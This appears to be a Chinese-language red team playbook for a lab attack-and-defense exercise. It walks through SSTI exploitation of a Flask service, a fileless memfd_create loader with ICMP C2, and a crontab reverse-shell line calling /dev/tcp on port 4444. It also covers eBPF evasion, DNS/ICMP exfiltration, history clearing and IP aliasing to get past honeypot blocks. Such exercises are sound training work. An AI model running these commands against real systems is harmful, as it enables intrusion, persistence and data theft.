# Red Team Playbook - 企業攻防演練紅方操作手冊

## 環境概覽

| 角色 | 位置 | 說明 |
|------|------|------|
| 紅軍攻擊機 | 同學筆電 (WSL2) | 攻擊發起端 |
| 企業靶機 | Lab 機器 | Flask SSTI 漏洞服務 + SSH 蜜罐 |
| 藍軍防禦中心 | Lab 機器 | eBPF MDR + 網路 MDR + SOC Dashboard |

## 目標基礎設施

| 服務 | Port | 說明 | 注意事項 |
|------|------|------|----------|
| Honeypot (假 SSH) | 2222 | 蜜罐陷阱 (`honeypot.py`) | **觸碰即觸發 MDR 封鎖 IP** |
| Diagnostic API (真目標) | 9999 | Flask SSTI 漏洞 (`target_app.py`) | 主要攻擊面 |
| Reverse Shell | 4444 | 紅方 listener 端口 | 回合 5 使用 |

**Target IP:** `<TARGET_IP>` (依實際環境調整)

---

## 攻擊流程 (Kill Chain)

### Phase 1: Reconnaissance (偵察)

```bash
# 執行偵察腳本
bash red_team/recon.sh <TARGET_IP>

# 或手動執行
nmap -p 2000-10000 -sV <TARGET_IP>
```

**關鍵發現：**
- Port 2222 → SSH banner (蜜罐，不要碰！觸碰會被封鎖 IP)
- Port 9999 → Diagnostic API (真正目標，Flask SSTI 漏洞)

### Phase 2: Exploitation — Fileless ICMP C2 (主要攻擊)

使用 `red_attacker.py`，透過 SSTI 注入 → memfd_create 無檔案載入 → ICMP 隱蔽 C2：

```bash
# 終端 1: 啟動 C2 Server（需要 sudo，因為用 ICMP raw socket）
sudo .venv/bin/python3 red_team/red_attacker.py -t <TARGET_IP> -l <ATTACKER_IP>

# 終端 2: 貼上 C2 輸出的 curl 指令觸發 SSTI
curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=<PAYLOAD>"
```

**攻擊鏈：**
```
SSTI 注入 → os.popen() → base64 -d → python3 loader
  └→ memfd_create (匿名記憶體 fd)
  └→ write(fd, agent_code)
  └→ fork() → execve("/usr/bin/python3", ["/proc/<pid>/fd/<N>"])
  └→ agent 透過 ICMP echo request 回連 C2（AES-256-CTR 加密）
```

**C2 操作（收到 beacon 後）：**
```
C2> whoami
root

C2> id
uid=0(root) gid=0(root)

C2> cat /etc/hostname
target-machine

C2> exit          # 終止 agent
C2> quit          # 退出 C2
```

**技術重點：**

| 技術 | 原理 |
|------|------|
| SSTI | Flask f-string + `render_template_string` → Jinja2 執行 `{{ }}` 中的程式碼 |
| memfd_create | syscall 319，建立匿名 RAM-only fd，不寫入磁碟 |
| ICMP Covert C2 | 資料藏在 ICMP echo request payload，AES-256-CTR 加密 |
| 無檔案執行 | execve 從 `/proc/<pid>/fd/<N>` 執行，無磁碟痕跡 |

### Phase 3: Post-Exploitation (後滲透)

在 C2 shell 中執行情報蒐集：

```
C2> whoami && id
C2> uname -a
C2> cat /etc/passwd
C2> ls -la /home/
```

### Phase 4: Persistence (持久化)

> 注意：以下指令在 C2 shell 中執行（靶機上）

```bash
# 植入 crontab 反向 shell (替換 <WSL2_IP>)
(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/<WSL2_IP>/4444 0>&1'") | crontab -
```

### Phase 5: Evasion — eBPF v1 Bypass (繞過防禦)

**場景**：藍軍已啟動 eBPF v1（`blue_ebpf_mdr.py --kill`），memfd_create 攻擊被攔截。
**策略**：改用不經過 memfd_create 的 TCP 反向 Shell。

```bash
# 攻擊機: 啟動 reverse shell listener + payload 產生器（不需要 sudo）
.venv/bin/python3 red_team/red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>

# 另一終端: 貼上輸出的 curl 指令
curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=<PAYLOAD>"
```

**繞過原理：**

| eBPF v1 Hook | 我們是否觸發 | 為什麼 |
|--------------|-------------|--------|
| `memfd_create` | ❌ 不觸發 | 不用 memfd，直接 fork |
| `execve /proc/fd` | ❌ 不觸發 | 不從 /proc/fd 執行 |
| `socket(SOCK_RAW)` | ❌ 不觸發 | 用 SOCK_STREAM (TCP) |

**攻擊鏈：**
```
SSTI → os.popen → base64 -d → python3 → fork()
  └→ child: socket(SOCK_STREAM) → connect(ATTACKER_IP:4444)
       → dup2(sock, 0) → dup2(sock, 1) → dup2(sock, 2)
       → pty.spawn("/bin/bash") → interactive shell
```

**注意**：此攻擊不需要 sudo（用 TCP 不用 ICMP raw socket）

### Phase 5b: Exfiltration (資料外傳)

```bash
# 攻擊機: 啟動接收器
sudo .venv/bin/python3 red_team/exfil_listener.py

# 靶機 (C2 shell 或 reverse shell 內): 部署 agent
# 先在攻擊機生成部署指令:
bash red_team/deploy_agent.sh <WSL2_IP>
# 然後將輸出貼到 shell 中執行
```

通道: DNS (主) / ICMP (備用)，自動偵測切換。
外傳完成後 agent 自動刪除。

### Phase 6: Cleanup (清除痕跡)

```bash
history -c
exit
```

---

## IP 切換原理 (繞過網路層 MDR 封鎖)

藍軍網路 MDR（`blue_mdr_network.py`）以 iptables DROP 封鎖觸碰蜜罐的 IP。紅隊透過 IP alias 掛載第二個 IP 繞過封鎖。

| IP | 用途 | 結果 |
|----|------|------|
| 172.22.137.14 (主) | 觸發蜜罐 port 2222 | 被 MDR 封鎖 |
| 172.22.137.15 (備用) | 攻擊 port 9999 | 未被封鎖 |

管理指令: `bash red_team/ip_switch.sh add` / `remove` / `status`

> **注意**：IP alias 只繞過網路層封鎖。如果藍軍同時啟動 eBPF，行為偵測仍然有效（不依賴 IP）。

---

## MITRE ATT&CK 對應

| 戰術 | 技術 ID | 說明 | 對應階段 |
|------|---------|------|----------|
| Reconnaissance | T1595 | Active Scanning | Phase 1: nmap |
| Initial Access | T1190 | Exploit Public-Facing App | Phase 2: SSTI 注入 |
| Execution | T1059.006 | Python Scripting | memfd loader / reverse shell |
| Defense Evasion | T1620 | Reflective Code Loading | memfd_create → execve /proc/fd |
| Defense Evasion | T1027 | Obfuscation (Base64 + AES-256-CTR) | payload 編碼與加密 |
| Defense Evasion | T1036 | Masquerading (IP 切換) | IP alias 繞過 MDR |
| Command & Control | T1095 | Non-App Layer Protocol (ICMP) | Phase 2: ICMP C2 |
| Command & Control | T1071.001 | App Layer Protocol (TCP) | Phase 5: reverse shell |
| Persistence | T1053.003 | Cron Job | Phase 4: crontab |
| Discovery | T1082 | System Information Discovery | whoami, uname |
| Collection | T1005 | Data from Local System | exfil_agent 蒐集 |
| Exfiltration | T1048.003 | Over Non-C2 Protocol (DNS/ICMP) | Phase 5b: 隱蔽通道外傳 |
| Defense Evasion | T1070.003 | Clear Command History | Phase 6: history -c |
| Defense Evasion | T1070.004 | File Deletion | exfil_agent 自刪 |

**刻意排除：** Privilege Escalation、Impact (控制爆炸半徑)

---

## 工具清單

| 工具 | 檔案 | 用途 |
|------|------|------|
| Nmap | (系統) | 埠掃描與服務探測 |
| Netcat (nc) | (系統) | 蜜罐觸發 / 連線測試 |
| red_attacker.py | `red_team/` | 主攻擊：SSTI → memfd → ICMP C2 (AES-256-CTR) |
| red_reverse_shell.py | `red_team/` | eBPF v1 繞過：TCP 反向 Shell |
| exploit.py | `red_team/` | 舊版 WAF bypass 攻擊（備用） |
| recon.sh | `red_team/` | 自動化偵察腳本 |
| ip_switch.sh | `red_team/` | IP alias 管理（繞過網路 MDR） |
| exfil_agent.py | `red_team/` | 靶機端自動蒐集 + 外傳 agent |
| exfil_listener.py | `red_team/` | 攻擊機端 DNS/ICMP 接收器 |
| deploy_agent.sh | `red_team/` | 一鍵生成 agent 部署指令 |
| post_exploit.sh | `red_team/` | 後滲透情報蒐集腳本 |

---

## 注意事項

1. **Port 2222 是蜜罐** — 觸碰會被網路 MDR 封鎖 IP，Demo 時用主 IP 觸發後用 `ip_switch.sh` 切換備用 IP
2. **替換 IP** — 使用前將 `<TARGET_IP>` 和 `<ATTACKER_IP>` / `<WSL2_IP>` 替換為實際 IP
3. **venv 環境** — 所有 Python 工具用 `.venv/bin/python3` 執行，需要 sudo 的用 `sudo .venv/bin/python3`
4. **純 CLI 操作** — 本演練禁止使用圖形化工具
5. **爆炸半徑控制** — 不進行提權和破壞性操作
6. **完整 Demo 腳本** — 請參考 `docs/DEMO_FLOW.md` 取得 7 回合完整演練流程
7. **環境重置** — Demo 結束後執行 `sudo bash cleanup.sh` 一鍵清除所有殘留（程序、iptables、log、loot、crontab）
